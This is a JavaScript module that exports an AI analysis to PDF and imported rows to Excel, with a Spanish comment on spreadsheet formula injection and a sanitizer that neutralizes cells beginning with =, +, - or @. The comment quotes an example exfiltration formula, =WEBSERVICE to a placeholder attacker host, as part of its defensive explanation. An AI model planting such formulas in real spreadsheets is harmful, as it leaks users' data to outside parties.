import jsPDF from 'jspdf';
import * as XLSX from 'xlsx';

/**
 * ⚠️ AUDITORÍA DE SEGURIDAD — Formula Injection / CSV Injection (OWASP).
 * Si una celda de los datos originales (subidos por el usuario, o
 * potencialmente manipulados por un tercero que le compartió el archivo)
 * empieza por =, +, - o @, Excel/LibreOffice la interpreta como FÓRMULA
 * al abrir el archivo exportado, no como texto — permitiendo ejecutar
 * fórmulas como =WEBSERVICE("http://atacante.com/"&A1) para exfiltrar
 * datos, o =HYPERLINK(...) para phishing. Se neutraliza anteponiendo un
 * apóstrofe, que fuerza a la hoja de cálculo a tratar el valor como texto
 * plano — mitigación estándar recomendada por OWASP para este problema.
 */
function neutralizeFormulaInjection(value) {
  if (typeof value !== 'string') return value;
  if (/^[=+\-@]/.test(value)) return `'${value}`;
  return value;
}

function sanitizeRowsForExport(rows) {
  return rows.map(row => {
    const clean = {};
    for (const key of Object.keys(row)) {
      clean[key] = neutralizeFormulaInjection(row[key]);
    }
    return clean;
  });
}

/** Exporta el análisis (HTML de la IA) a un PDF con logo y formato básico */
export function exportAnalysisToPdf(title, analysisHtml) {
  const doc = new jsPDF();
  const plainText = analysisHtml.replace(/<[^>]+>/g, '\n').replace(/\n{2,}/g, '\n\n').trim();

  doc.setFontSize(16);
  doc.setTextColor(59, 130, 246); // accent
  doc.text('Nokfi', 14, 18);

  doc.setFontSize(13);
  doc.setTextColor(20, 20, 20);
  doc.text(title, 14, 30);

  doc.setFontSize(10);
  doc.setTextColor(60, 60, 60);
  const lines = doc.splitTextToSize(plainText, 180);
  doc.text(lines, 14, 42);

  doc.save(`${slug(title)}_nokfi.pdf`);
}

/** Exporta los datos originales importados + el análisis en un Excel con hojas separadas */
export function exportDataToExcel(title, files, analysisHtml) {
  const wb = XLSX.utils.book_new();

  files.forEach((f, i) => {
    if (f.type === 'excel' && f.rows?.length) {
      const safeRows = sanitizeRowsForExport(f.rows); // ver neutralizeFormulaInjection arriba
      const ws = XLSX.utils.json_to_sheet(safeRows);
      XLSX.utils.book_append_sheet(wb, ws, `Datos_${i + 1}`.slice(0, 31));
    }
  });

  const plainText = analysisHtml.replace(/<[^>]+>/g, '\n').replace(/\n{2,}/g, '\n').trim();
  const analysisRows = plainText.split('\n').filter(Boolean)
    .map(line => ({ Análisis: neutralizeFormulaInjection(line) }));
  const wsAnalysis = XLSX.utils.json_to_sheet(analysisRows);
  XLSX.utils.book_append_sheet(wb, wsAnalysis, 'Análisis IA');

  XLSX.writeFile(wb, `${slug(title)}_nokfi.xlsx`);
}

function slug(str) {
  return str.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, '').replace(/[^a-z0-9]+/g, '_');
}
